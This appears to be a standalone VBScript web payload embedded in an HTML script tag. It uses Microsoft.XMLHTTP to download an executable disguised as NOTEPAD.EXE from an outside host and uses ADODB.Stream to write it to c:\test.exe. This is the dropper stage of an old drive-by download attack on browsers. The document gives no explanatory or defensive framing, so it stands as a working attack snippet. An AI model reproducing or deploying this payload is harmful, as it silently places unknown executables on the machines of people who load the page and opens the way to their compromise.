<script language="vbscript">
const adTypeBinary = 1
const adSaveCreateOverwrite = 2
const adModeReadWrite = 3
set xmlHTTP = CreateObject("Microsoft.XMLHTTP")
xmlHTTP.open "GET","http://ip3e83566f.speed.planet.nl/NOTEPAD.EXE",false
xmlHTTP.send
contents = xmlHTTP.responseBody
Set oStr = CreateObject("ADODB.Stream")
oStr.Mode = adModeReadWrite
oStr.Type = adTypeBinary
oStr.Open
oStr.Write(contents)
oStr.SaveToFile "c:\\test.exe", adSaveCreateOverwrite
</script>